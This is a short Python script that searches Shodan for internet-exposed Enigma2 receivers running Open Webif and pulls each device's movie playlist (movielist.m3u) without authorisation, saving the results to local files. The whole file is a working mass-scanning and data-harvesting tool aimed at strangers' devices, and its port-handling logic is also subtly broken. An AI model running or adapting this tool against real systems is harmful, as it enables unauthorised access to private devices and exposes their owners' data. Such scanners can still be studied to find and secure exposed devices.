#!/usr/bin/env python
#
# engima2_watch.py
# Search SHODAN for Engima 2 box's that are watching a channel.
#
# Author: random_robbie

import shodan
import sys
import re
import requests
from time import sleep

# Configuration
API_KEY = "YOURSHODANAPIKEY"
SEARCH_FOR = "title:'Open Webif'"
session = requests.Session()

def grab_playling (IP,PORT,CC):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		if PORT == "80":
			URL = "http://"+IP+"/web/movielist.m3u"
			
		if PORT == "443":
			URL = "https://"+IP+"/web/movielist.m3u"
			
		if PORT == "8443":
			URL = "https://"+IP+"/web/movielist.m3u"
		else:
			URL = "http://"+IP+":"+PORT+"/web/movielist.m3u"
		
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
		response = session.get(URL, headers=headers, timeout=15, verify=False)
		result = response.text
		if "EXTM3U" in result:
			text_file = open("./m3u/"+IP+"- Movies.m3u", "a")
			text_file.write(""+result+"\n")
			text_file.close()
			print ("[*] OOOOH we have some films something... [*]\n")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		#print (e)
		print ("[*] Nothing Found on IP:"+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_playling (IP,PORT,CC)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)